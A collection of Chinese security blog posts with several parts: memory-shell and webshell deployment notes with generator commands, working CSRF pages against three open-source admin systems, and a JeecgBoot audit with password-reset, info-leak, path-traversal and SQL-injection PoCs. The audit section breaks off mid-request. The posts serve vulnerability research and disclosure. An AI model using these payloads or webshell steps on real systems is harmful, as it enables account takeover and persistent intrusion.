[{"content":"跟着炬哥打了一次实战的环境，打了一次靶场的环境，很明显可以感觉到内存马这一块还是有点不行，学习一下平常实战的时候怎么打内存马。基本上按照TOP10类似的方向来看怎么打吧。\n文件上传打内存马 这个其实有点奇怪的，因为文件上传来说，应该就是直接上传jsp马了，可能打个内存马当做权限维持之类的吧。写一个demo模拟文件上传的情况。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 package org.apache; import java.io.File; import java.io.IOException; import java.io.PrintWriter; import javax.servlet.ServletException; import javax.servlet.annotation.MultipartConfig; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.Part; /** * 使用 Servlet 3.0 的 @MultipartConfig 处理 multipart/form-data 请求 */ @WebServlet(\u0026#34;/upload\u0026#34;) @MultipartConfig( fileSizeThreshold = 1024 * 1024, // 1 MB - 超过此大小会写入磁盘 maxFileSize = 1024 * 1024 * 10, // 10 MB - 单个文件最大大小 maxRequestSize = 1024 * 1024 * 50 // 50 MB - 整个请求最大大小 ) public class FileUploadServlet extends HttpServlet { // 上传文件的保存目录（可根据需要修改） private static final String UPLOAD_DIR = \u0026#34;uploads\u0026#34;; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // 1. 获取上传文件的保存路径 String applicationPath = request.getServletContext().getRealPath(\u0026#34;\u0026#34;); String uploadPath = applicationPath + File.separator + UPLOAD_DIR; File uploadDir = new File(uploadPath); if (!uploadDir.exists()) { uploadDir.mkdirs(); // 如果目录不存在则创建 } response.setContentType(\u0026#34;text/html;charset=UTF-8\u0026#34;); PrintWriter out = response.getWriter(); try { // 2. 通过 request.getPart(\u0026#34;file\u0026#34;) 获取上传的文件 Part Part filePart = request.getPart(\u0026#34;file\u0026#34;); // \u0026#34;file\u0026#34; 需与表单 input 的 name 一致 if (filePart == null || filePart.getSize() == 0) { out.println(\u0026#34;\u0026lt;h3\u0026gt;没有选择文件或文件为空\u0026lt;/h3\u0026gt;\u0026#34;); return; } // 3. 获取原始文件名（不同浏览器实现可能有差异，建议使用封装方法） String fileName = getFileName(filePart); // 4. 拼接最终保存路径 String filePath = uploadPath + File.separator + fileName; // 5. 将文件写入磁盘 filePart.write(filePath); out.println(\u0026#34;\u0026lt;h3\u0026gt;文件上传成功！\u0026lt;/h3\u0026gt;\u0026#34;); out.println(\u0026#34;保存路径：\u0026#34; + filePath); out.println(\u0026#34;\u0026lt;br/\u0026gt;\u0026lt;a href=\u0026#39;upload.html\u0026#39;\u0026gt;返回上传\u0026lt;/a\u0026gt;\u0026#34;); } catch (Exception e) { e.printStackTrace(); out.println(\u0026#34;\u0026lt;h3\u0026gt;文件上传失败：\u0026#34; + e.getMessage() + \u0026#34;\u0026lt;/h3\u0026gt;\u0026#34;); } finally { out.close(); } } /** * 从 Part 中解析出文件名 * Servlet 3.1 开始可以直接使用 Part.getSubmittedFileName()，但为了兼容 3.0，手动解析 */ private String getFileName(Part part) { String contentDisposition = part.getHeader(\u0026#34;content-disposition\u0026#34;); String[] elements = contentDisposition.split(\u0026#34;;\u0026#34;); for (String element : elements) { if (element.trim().startsWith(\u0026#34;filename\u0026#34;)) { return element.substring(element.indexOf(\u0026#39;=\u0026#39;) + 1).trim().replace(\u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;\u0026#34;); } } return \u0026#34;unknown_\u0026#34; + System.currentTimeMillis(); } } 然后我们就可以去上传JSP马了，当然这里我们是来研究工具怎么做的，我们这里直接上工具。\n:::warning msmap：https://github.com/hosch3n/msmap\npython generator.py Java Tomcat Listener AES128 AntSword xxxx\npython generator.py Java Tomcat Servlet RC4 Godzilla xxxx\n这个我没打成功，看下一个吧。\ngodzilla：https://github.com/BeichenDream/Godzilla/releases\n这个就直接打开然后生成JSP马就可以了。然后直接进入，用自带的插件就可以生成内存马了。\nJSP注入内存马还是很多的，这里其实没有拓展了，这个是很简单的，通常应该是要绕过过滤\n:::\nRCE打内存马 这个东西的打法还挺常见的，命令执行打内存马呗，这个要好好学习一下。\n出网的情况其实很简单，按照刚刚的路线，直接去打一个JSP马进来就好了。比如wegt去进行一个下载之类的，强调一下不出网的情况吧。\n:::warning 不出网RCE打内存马：\n通过echo等输入命令，将JSP马的base64编码输入到临时文件中。\n再用base64解码出来，变成JSP马，后续变内存马跟前面是一致的。\n:::\n反序列化打内存马 这个算是最常见的了，这里的工具比较多，主要讲几种方法吧。\n:::warning 主要是看最后执行到的是什么方法吧\n命令执行：这个就可以去打RCE访问JSP马的思路，不出网的话也是差不多\n代码执行：有代码执行的时候相当于说你可以去控制执行的方法了，直接去注册路由就行\n方法调用：同理，有方法调用就直接打就可以了\n:::\n找一些比较常见的工具吧。\nysoserial：入门级别的工具，多使用习惯。\nhttps://github.com/frohoff/ysoserial\nJava-Deserialization-Scanner：扫描反序列化利用点的工具\nhttps://github.com/federicodotta/Java-Deserialization-Scanner\nGadgetInspector： 自动挖Java 反序列化漏洞的 Gadget 链\nhttps://github.com/5wimming/gadgetinspector\nSSTI打内存马 这个类型就比较多了，比如说BCEL注入什么的，这个我只能说打一个例子吧。\n直接用工具打的，工具如下：\n:::warning JavaGadgetGenerator：https://github.com/Lotus6/JavaGadgetGenerator\n这里有点不熟练，还要再试几下。\n:::\n","date":"2026-02-13T00:00:00Z","image":"https://xxxxctfer.github.io/images/Java/1.png","permalink":"https://xxxxctfer.github.io/p/%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%AD%A5%E8%BF%90%E7%94%A8/","title":"内存马的学习(初步运用)"},{"content":"还是一样的，老规矩看看介绍。\n汽车租赁系统 carRental 汽车租赁系统总共分为两个大的模块，分别是系统模块和业务模块。其中系统模块和业务模块底下又有其子模块。\n环境搭建 老步骤了，不多解释。这里用tomcat启动即可。 启动完了之后就是一些测试了，感觉这个挺水的，就随便一点吧，当是交个任务了。 请求包如下： 代码脚本如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;http://localhost:8000/carRental/user/addUser.action\u0026#34; method=\u0026#34;POST\u0026#34; name=\u0026#34;form1\u0026#34; enctype=\u0026#34;application/x-www-form-urlencoded\u0026#34; \u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;userid\u0026#34; value=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;readname\u0026#34; value=\u0026#34;test\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;identity\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;address\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;phone\u0026#34; value=\u0026#34;15173333333\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;position\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;sex\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;available\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt;history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;);\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; OK。\n","date":"2026-01-23T00:00:00Z","image":"https://xxxxctfer.github.io/images/CVE2/1.png","permalink":"https://xxxxctfer.github.io/p/%E7%AC%AC%E4%BA%8C%E4%B8%AAcve%E6%BC%8F%E6%B4%9E/","title":"第二个CVE漏洞"},{"content":"挖的第一个CVE，有点不熟练，尽力了，主要是耗费在找系统这个上面的时间太多了，不熟练。\n先来看看是哪个系统吧，这里给链接出来先。https://github.com/muyinchen/migo-security\n简单看看项目介绍\n项目说明\nmigo-security是一个轻量级权限管理系统，其核心设计目标是开发迅速、学习简单、轻量级、易扩展 使用migo-security搭建项目，只需编写30%左右代码，其余的代码交给系统自动生成 部分代码使用Java8 Stream lambda 风格开发，已提供老式风格代码，可对比学习 环境配置 基本没什么东西，把代码从github上面拉下来，然后执行SQL文件就可以了，挺简单的。 git clone https://github.com/muyinchen/migo-security.git 执行db文件夹下的SQL文件 找到 migo-common 模块下的 db.properties 文件，修改数据库连接配置。 然后用IDEA，加一个Tomcat的配置，直接启动就好了。 测试 登录进去之后就是找有可能出现问题的功能点。后台管理系统功能点不多，我们找有关权限的部分。 这里很明显可以看到吧，一个角色管理，还有修改密码什么的，都是很有可能存在漏洞的地方，我们直接抓个包。 我这里是测试完了才写的这个文章，所以可能有些奇奇怪怪的东西，不要在意。 然后就能看到这样的请求包，其实看到有XSRF-TOKEN的时候，心凉了半截，一般有这个就打不了CSRF了，但是后面删除测试的时候，发现还是OK的，参数重复的地方做了检测，这里完全没做检测。通是删除Referer的请求包，去发包测试。 可以看到是成功发包的。另外一个功能也一样，我就不测试了，看一个包就行。 给权限的功能点，很明显也是有的。那就没什么好说的了，我们还可以去看一下漏洞的文件是哪个。 确认了一下，功能点应该是差不多的，但是可能找错了，懒得改了，反正。然后就是写攻击脚本了。两个的都写了，可以简单看看。\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; const data = {\u0026#34;status\u0026#34;:1,\u0026#34;roleIdList\u0026#34;:[1],\u0026#34;username\u0026#34;:\u0026#34;xxxx\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123456\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;123@163.com\u0026#34;,\u0026#34;mobile\u0026#34;:\u0026#34;12345678911\u0026#34;}; const xhr = new XMLHttpRequest(); xhr.open(\u0026#39;POST\u0026#39;, \u0026#39;http://localhost:8080/migo-web/sys/user/save\u0026#39;); xhr.setRequestHeader(\u0026#39;Content-Type\u0026#39;, \u0026#39;application/json\u0026#39;); xhr.send(JSON.stringify(data)); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; const data = {\u0026#34;createTime\u0026#34;:\u0026#34;2026-01-22 16:39:09\u0026#34;,\u0026#34;createUserId\u0026#34;:1,\u0026#34;menuIdList\u0026#34;:[1,2,15,16,17,18,3,19,20,21,22,4,23,24,25,26,5,6,7,8,9,10,11,12,13,14,27,30,29,28],\u0026#34;remark\u0026#34;:null,\u0026#34;roleId\u0026#34;:3,\u0026#34;roleName\u0026#34;:\u0026#34;xxxx\u0026#34;}; const xhr = new XMLHttpRequest(); xhr.open(\u0026#39;POST\u0026#39;, \u0026#39;http://localhost:8080/migo-web/sys/role/upda\u0026#39;); xhr.setRequestHeader(\u0026#39;Content-Type\u0026#39;, \u0026#39;application/json\u0026#39;); xhr.send(JSON.stringify(data)); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; OK，完事。等待CVE提交成功了。\n","date":"2026-01-22T00:00:00Z","image":"https://xxxxctfer.github.io/images/CVE1/3.png","permalink":"https://xxxxctfer.github.io/p/%E7%AC%AC%E4%B8%80%E4%B8%AAcve%E6%BC%8F%E6%B4%9E%E6%AD%A3%E5%BC%8F/","title":"第一个CVE漏洞(正式)"},{"content":"挖的第零个CVE，有点不熟练，尽力了，主要是耗费在找系统这个上面的时间太多了，不熟练。(还找的是个错的，真服了)\n先来看看是哪个系统吧，这里给链接出来先。https://github.com/JDAO-Lab/jidao-logyin\n简单看看项目介绍\nlogYin admin后台管理系统，基于java11、maven3.6.1、pear-admin开发的一款通用开发框架。\n环境配置 很简单对吧，感觉入手就是要做这么简单的，然后我们把代码弄下来，去简单配置一下，步骤比较简单，在mysql数据库里面创建一个数据库，然后运行对应的SQL文件，文件是给出来了的，然后还有redis数据库，这个也是去下载一下就好了。\n当然，这里也是出现了问题的，就是有一个参数，数据库中是没设置，感兴趣可以设置一下，这里我图省事，是直接把代码里的检查注释掉了。 然后就可以正常访问登录了。\n测试 登录进去之后就是找有可能出现问题的功能点。后台管理系统功能点不多，我们找有关权限的部分。 很明显这里是最有可能出问题的，毕竟有管理员的信息的东西，我们简单看看就可以找到更改密码的地方，甚至我们可以新建一个用户去更改。 很明显就是这个地方了，我们直接抓个包。然后重发的时候去掉Referer头进行测试，发现依然回显成功。 那就很明显的CSRF漏洞了，直接就是挖到这里，然后我们去写一个攻击测试的payload看看。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; const data = { id: \u0026#34;1\u0026#34;, ruleId: \u0026#34;1\u0026#34;, file: \u0026#34;\u0026#34;, avatar: \u0026#34;https://oss.youqiong.net/2a8038416840457e8edd92d939ccf5ae/184b1aadd7d744babadc54ae69bfa143.jpg\u0026#34;, password: \u0026#34;123456789\u0026#34;, enable: \u0026#34;1\u0026#34; }; const xhr = new XMLHttpRequest(); xhr.open(\u0026#39;POST\u0026#39;, \u0026#39;http://localhost:8082/admin/sys_admin/update\u0026#39;); xhr.setRequestHeader(\u0026#39;Content-Type\u0026#39;, \u0026#39;application/json\u0026#39;); xhr.send(JSON.stringify(data)); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 大概就是这个。OK，完事。(我真服了，0star系统，好悬没气死我) 虽然这个没用上，但是也算是理了一遍逻辑吧，也挺好的了。\n","date":"2026-01-21T00:00:00Z","image":"https://xxxxctfer.github.io/images/CVE0/1.png","permalink":"https://xxxxctfer.github.io/p/%E7%AC%AC%E9%9B%B6%E4%B8%AAcve%E6%BC%8F%E6%B4%9E/","title":"第零个CVE漏洞"},{"content":"我们还是先搜索一下这是个什么东西，这次代码审计的目的也就是为了学习一下怎么审计，去打一些老漏洞，挖掘一下看看。 先看搜索到的结果。\n[!NOTE] 简介 JeecgBoot是一款集成AI应用的，基于BPM流程的低代码平台，旨在帮助企业快速实现低代码开发和构建个性化AI应用！前后端分离架构Ant Design\u0026amp;Vue3，SpringBoot，SpringCloud Alibaba，Mybatis-plus，Shiro。强大的代码生成器让前后端代码一键生成，无需写任何代码！ 引领AI低代码开发模式: AI生成-\u0026gt;OnlineCoding-\u0026gt; 代码生成-\u0026gt; 手工MERGE， 帮助Java项目解决80%的重复工作，让开发更多关注业务，提高效率、节省成本，同时又不失灵活性！低代码能力：Online表单、表单设计、流程设计、Online报表、大屏/仪表盘设计、报表设计; AI应用平台功能：AI知识库问答、AI模型管理、AI流程编排、AI聊天等，支持含ChatGPT、DeepSeek、Ollama等多种AI大模型。\nOK，大体能知道它是个什么东西就行，接下来来看漏洞什么的。\n弱口令漏洞 我们访问我们的前端，也就是3000的localhost，就可以看到登录界面。 我们这里直接尝试弱口令的漏洞攻击试一下。 发现直接进入了，我们去看一下源头是怎么来的。很简单，在日志当中，我们可以看到它的全类名是 org.jeecg.modules.system.controller.LoginController ，当然，其实不看日志也可以看到这个类的，这里只是偷懒了一下。\nLoginController 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 @ApiOperation(\u0026#34;登录接口\u0026#34;) @RequestMapping(value = \u0026#34;/login\u0026#34;, method = RequestMethod.POST) public Result\u0026lt;JSONObject\u0026gt; login(@RequestBody SysLoginModel sysLoginModel){ Result\u0026lt;JSONObject\u0026gt; result = new Result\u0026lt;JSONObject\u0026gt;(); String username = sysLoginModel.getUsername(); String password = sysLoginModel.getPassword(); //update-begin--Author:scott Date:20190805 for：暂时注释掉密码加密逻辑，有点问题 //前端密码加密，后端进行密码解密 //password = AesEncryptUtil.desEncrypt(sysLoginModel.getPassword().replaceAll(\u0026#34;%2B\u0026#34;, \u0026#34;\\\\+\u0026#34;)).trim();//密码解密 //update-begin--Author:scott Date:20190805 for：暂时注释掉密码加密逻辑，有点问题 //update-begin-author:taoyan date:20190828 for:校验验证码 String captcha = sysLoginModel.getCaptcha(); if(captcha==null){ result.error500(\u0026#34;验证码无效\u0026#34;); return result; } String lowerCaseCaptcha = captcha.toLowerCase(); String realKey = Md5Util.md5Encode(lowerCaseCaptcha+sysLoginModel.getCheckKey(), \u0026#34;utf-8\u0026#34;); Object checkCode = redisUtil.get(realKey); //当进入登录页时，有一定几率出现验证码错误 #1714 if(checkCode==null || !checkCode.toString().equals(lowerCaseCaptcha)) { log.warn(\u0026#34;验证码错误，key= {} , Ui checkCode= {}, Redis checkCode = {}\u0026#34;, sysLoginModel.getCheckKey(), lowerCaseCaptcha, checkCode); result.error500(\u0026#34;验证码错误\u0026#34;); // 改成特殊的code 便于前端判断 result.setCode(HttpStatus.PRECONDITION_FAILED.value()); return result; } //update-end-author:taoyan date:20190828 for:校验验证码 //1. 校验用户是否有效 //update-begin-author:wangshuai date:20200601 for: 登录代码验证用户是否注销bug，if条件永远为false LambdaQueryWrapper\u0026lt;SysUser\u0026gt; queryWrapper = new LambdaQueryWrapper\u0026lt;\u0026gt;(); queryWrapper.eq(SysUser::getUsername,username); SysUser sysUser = sysUserService.getOne(queryWrapper); //update-end-author:wangshuai date:20200601 for: 登录代码验证用户是否注销bug，if条件永远为false result = sysUserService.checkUserIsEffective(sysUser); if(!result.isSuccess()) { return result; } //2. 校验用户名或密码是否正确 String userpassword = PasswordUtil.encrypt(username, password, sysUser.getSalt()); String syspassword = sysUser.getPassword(); if (!syspassword.equals(userpassword)) { result.error500(\u0026#34;用户名或密码错误\u0026#34;); return result; } //用户登录信息 userInfo(sysUser, result); //update-begin--Author:liusq Date:20210126 for：登录成功，删除redis中的验证码 redisUtil.del(realKey); //update-begin--Author:liusq Date:20210126 for：登录成功，删除redis中的验证码 LoginUser loginUser = new LoginUser(); BeanUtils.copyProperties(sysUser, loginUser); baseCommonService.addLog(\u0026#34;用户名: \u0026#34; + username + \u0026#34;,登录成功！\u0026#34;, CommonConstant.LOG_TYPE_1, null,loginUser); //update-end--Author:wangshuai Date:20200714 for：登录日志没有记录人员 return result; } 我们很容易就能找到这一段代码，可以看到是往Sysuser实体类里面找的，大概率就是sys_user的表，我们进到对应的类中查看，没有多余的注解专门说明书哪个表，所以确定就是这个表，因为是本地，还是看一下吧。 很明显可以看到账号密码的存储啊，这里就不测试了，肯定是admin的密码设成了123456了。这里就直接说一个弱口令就进去了。\n修改建议 将管理员账号修改为非admin等容易表明权限的账号名，密码也要修改为不会被爆破出来的独特密码，能够有效减少弱口令登录的情况。\n任意用户密码重置 第二个漏洞出现在修改密码的位置，虽然文章里直接给了我们代码的位置，我们按照正常审计流程，确定漏洞存在点先，直接搜索这个接口。\npasswordChange接口 我们审计到这个代码的时候发现存在漏洞情况，先复制代码下来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 @GetMapping(\u0026#34;/passwordChange\u0026#34;) public Result\u0026lt;SysUser\u0026gt; passwordChange(@RequestParam(name=\u0026#34;username\u0026#34;)String username, @RequestParam(name=\u0026#34;password\u0026#34;)String password, @RequestParam(name=\u0026#34;smscode\u0026#34;)String smscode, @RequestParam(name=\u0026#34;phone\u0026#34;) String phone) { Result\u0026lt;SysUser\u0026gt; result = new Result\u0026lt;SysUser\u0026gt;(); if(oConvertUtils.isEmpty(username) || oConvertUtils.isEmpty(password) || oConvertUtils.isEmpty(smscode) || oConvertUtils.isEmpty(phone) ) { result.setMessage(\u0026#34;重置密码失败！\u0026#34;); result.setSuccess(false); return result; } SysUser sysUser=new SysUser(); Object object= redisUtil.get(phone); if(null==object) { result.setMessage(\u0026#34;短信验证码失效！\u0026#34;); result.setSuccess(false); return result; } if(!smscode.equals(object.toString())) { result.setMessage(\u0026#34;短信验证码不匹配！\u0026#34;); result.setSuccess(false); return result; } sysUser = this.sysUserService.getOne(new LambdaQueryWrapper\u0026lt;SysUser\u0026gt;().eq(SysUser::getUsername,username).eq(SysUser::getPhone,phone)); if (sysUser == null) { result.setMessage(\u0026#34;未找到用户！\u0026#34;); result.setSuccess(false); return result; } else { String salt = oConvertUtils.randomGen(8); sysUser.setSalt(salt); String passwordEncode = PasswordUtil.encrypt(sysUser.getUsername(), password, salt); sysUser.setPassword(passwordEncode); this.sysUserService.updateById(sysUser); //update-begin---author:wangshuai ---date:20220316 for：[VUEN-234]密码重置添加敏感日志------------ baseCommonService.addLog(\u0026#34;重置 \u0026#34;+username+\u0026#34; 的密码，操作人： \u0026#34; +sysUser.getUsername() ,CommonConstant.LOG_TYPE_2, 2); //update-end---author:wangshuai ---date:20220316 for：[VUEN-234]密码重置添加敏感日志------------ result.setSuccess(true); result.setMessage(\u0026#34;密码重置完成！\u0026#34;); return result; } } 这里看似很安全，但是存在致命的漏洞，但是貌似是下载的这个已经修改了？但是我查的时候看到了这个版本的还是有这个任意用户密码修改的漏洞的。先放一下，等下再看看。 感觉是这个地方的接口已经被修复了，看了一下之前的poc，发现都是将smscode和phone设为空通过的，下面是找到的一个poc。\n1 2 3 4 5 6 7 GET /jeecg-boot/sys/user/passwordChange?username=admin\u0026amp;password=admin\u0026amp;smscode=\u0026amp;phone= HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive 但是很明显代码中加了isEmpty方法的处理，去看了一下是对这种情况进行了处理的，应该是下载的这个已经修复过了，虽然查的时候我这个版本是有问题的。可能下的不是官方的吧。我本地也试了，确实是通过不了的，感觉是老版本漏洞。\n修复建议 这段代码最严重的问题就在于第一行，@GetMapping(\u0026quot;/passwordChange\u0026quot;)，这行导致了它可以被网上任意用户进行访问和发送请求，很恶心。建议的方法是将GET请求改变成POST请求或者PUT请求，不容易泄露出这个参数，或者再加上一些编码，防止被抓包之后发现这个接口的存在。\n信息泄露漏洞 第三个漏洞是有关信息泄露的漏洞的，这里看到了版本是在2.4.5之前，版本有些太老了，我这里也没有去下载了，直接看看当前版本中可能修复的地方吧。\nquerySysUser接口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // /** // * 根据用户名或手机号查询用户信息 // * @param // * @return // */ // @GetMapping(\u0026#34;/querySysUser\u0026#34;) // public Result\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; querySysUser(SysUser sysUser) { // String phone = sysUser.getPhone(); // String username = sysUser.getUsername(); // Result\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; result = new Result\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt;(); // Map\u0026lt;String, Object\u0026gt; map = new HashMap\u0026lt;String, Object\u0026gt;(); // if (oConvertUtils.isNotEmpty(phone)) { // SysUser user = sysUserService.getUserByPhone(phone); // if(user!=null) { // map.put(\u0026#34;username\u0026#34;,user.getUsername()); // map.put(\u0026#34;phone\u0026#34;,user.getPhone()); // result.setSuccess(true); // result.setResult(map); // return result; // } // } // if (oConvertUtils.isNotEmpty(username)) { // SysUser user = sysUserService.getUserByName(username); // if(user!=null) { // map.put(\u0026#34;username\u0026#34;,user.getUsername()); // map.put(\u0026#34;phone\u0026#34;,user.getPhone()); // result.setSuccess(true); // result.setResult(map); // return result; // } // } // result.setSuccess(false); // result.setMessage(\u0026#34;验证失败\u0026#34;); // return result; // } 被注释掉了，看来是删除了这个方法，简单审计一下代码，可以看到。只要查到了用户名或者电话号码其中一个，在代码中都会自动去检测另一个是什么，然后直接匹配出来进行查询。很明显的一个信息泄露啊，最简单的admin肯定就能查出来了。 POC如下：\n1 /jeecg-boot/sys/user/querySysUser?username=admin 修复建议 直接删除也没什么毛病，主要是要先确定电话号码和用户名是同一人的，才能提供查询的效果，单一匹配漏洞太明显了，要有非空的判断。\n目录遍历漏洞 接着来看吧。\nJS文件代码 1 2 3 4 5 6 7 8 9 data:function(){return{ title:\u0026#34;选择文件目录\u0026#34;, visible:!1, confirmLoading:!1, treeData:[], fileTreeUrl:\u0026#34;/online/cgform/head/fileTree\u0026#34;, rootFileUrl:\u0026#34;/online/cgform/head/rootFile\u0026#34;, selectedKey:\u0026#34;\u0026#34; }} 可以看到这里就是对应的接口，我们看看对应的逻辑代码\n1 2 3 4 5 6 7 8 9 10 11 12 onLoadData:function(e){ var t=this; return new Promise((function(n){ if(e.dataRef.children)n(); else{ var a={parentPath:e.dataRef.key}; Object(i[\u0026#34;c\u0026#34;])(t.fileTreeUrl,a).then((function(a){ a.success\u0026amp;\u0026amp;(e.dataRef.children=a.result,t.treeData=o(t.treeData)),n() })) } })) } 看这个代码就可以发现，这里直接接收前端GET传过来的参数，并且没有任何权限校验，所以我们可以直接访问这个接口，然后进行攻击。 POC如下： /jeecg-boot/online/cgform/head/fileTree?_t=1632524014\u0026amp;parentPath=/ 这里貌似是因为时间戳的原因，直接看不到，但是可以访问到，漏洞应该是存在的，因为没有做权限的判断。 如果有需要的话，可以写一个脚本来跑一下，大概率是可以获取的。\n修复建议 增加权限的校验，只让管理员有查询权限，或者非管理员的参数只能为固定的，比如某个按钮直接访问这个接口，放回对应的文件夹，但是不能修改参数等。\nSQL注入 这里的SQL注入点挺多的，先看看吧。\nqueryTableData接口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 @GetMapping(\u0026#34;/queryTableData\u0026#34;) public Result\u0026lt;List\u0026lt;DictModel\u0026gt;\u0026gt; queryTableData(DictQuery query, @RequestParam(name = \u0026#34;pageNo\u0026#34;, defaultValue = \u0026#34;1\u0026#34;) Integer pageNo, @RequestParam(name = \u0026#34;pageSize\u0026#34;, defaultValue = \u0026#34;10\u0026#34;) Integer pageSize, @RequestParam(value = \u0026#34;sign\u0026#34;,required = false) String sign,HttpServletRequest request){ Result\u0026lt;List\u0026lt;DictModel\u0026gt;\u0026gt; res = new Result\u0026lt;List\u0026lt;DictModel\u0026gt;\u0026gt;(); // SQL注入漏洞 sign签名校验 String dictCode = query.getTable()+\u0026#34;,\u0026#34;+query.getText()+\u0026#34;,\u0026#34;+query.getCode(); SqlInjectionUtil.filterContent(dictCode); List\u0026lt;DictModel\u0026gt; ls = this.sysDictService.queryDictTablePageList(query,pageSize,pageNo); res.setResult(ls); res.setSuccess(true); return res; } 这里的代码漏洞还是挺明显的啊，很明显就是直接进行了拼接，然后去进行的一个查询的操作，我们先看一下SqlInjectionUtil.filterContent是个什么方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 public static void filterContent(String value, String customXssString) { if (value == null || \u0026#34;\u0026#34;.equals(value)) { return; } // 统一转为小写 value = value.toLowerCase(); //SQL注入检测存在绕过风险 https://gitee.com/jeecg/jeecg-boot/issues/I4NZGE value = value.replaceAll(\u0026#34;/\\\\*.*\\\\*/\u0026#34;,\u0026#34;\u0026#34;); String[] xssArr = XSS_STR.split(\u0026#34;\\\\|\u0026#34;); for (int i = 0; i \u0026lt; xssArr.length; i++) { if (value.indexOf(xssArr[i]) \u0026gt; -1) { log.error(\u0026#34;请注意，存在SQL注入关键词---\u0026gt; {}\u0026#34;, xssArr[i]); log.error(\u0026#34;请注意，值可能存在SQL注入风险!---\u0026gt; {}\u0026#34;, value); throw new RuntimeException(\u0026#34;请注意，值可能存在SQL注入风险!---\u0026gt;\u0026#34; + value); } } //update-begin-author:taoyan date:2022-7-13 for: 除了XSS_STR这些提前设置好的，还需要额外的校验比如 单引号 if (customXssString != null) { String[] xssArr2 = customXssString.split(\u0026#34;\\\\|\u0026#34;); for (int i = 0; i \u0026lt; xssArr2.length; i++) { if (value.indexOf(xssArr2[i]) \u0026gt; -1) { log.error(\u0026#34;请注意，存在SQL注入关键词---\u0026gt; {}\u0026#34;, xssArr2[i]); log.error(\u0026#34;请注意，值可能存在SQL注入风险!---\u0026gt; {}\u0026#34;, value); throw new RuntimeException(\u0026#34;请注意，值可能存在SQL注入风险!---\u0026gt;\u0026#34; + value); } } } //update-end-author:taoyan date:2022-7-13 for: 除了XSS_STR这些提前设置好的，还需要额外的校验比如 单引号 if(Pattern.matches(SHOW_TABLES, value) || Pattern.matches(REGULAR_EXPRE_USER, value)){ throw new RuntimeException(\u0026#34;请注意，值可能存在SQL注入风险!---\u0026gt;\u0026#34; + value); } return; } 很明显的一个SQL的waf啊，看看貌似是用黑名单来waf的，但是貌似很多东西都没waf到啊，先看看黑名单有哪些。\n1 private final static String XSS_STR = \u0026#34;and |exec |insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |;|or |+|user()\u0026#34;; 别的东西就不看了，可以知道很多都没过滤到了，基本可以确定这里就是有漏洞的了，我们直接去打一下试试。 根据网上的POC攻击一个，就可以发现顺利报错出结果了，把请求和回显都放下来。\n1 2 3 4 5 6 关键请求头： POST /jeecg-boot/jmreport/qurestSql HTTP/1.1 Content-Type: application/json; 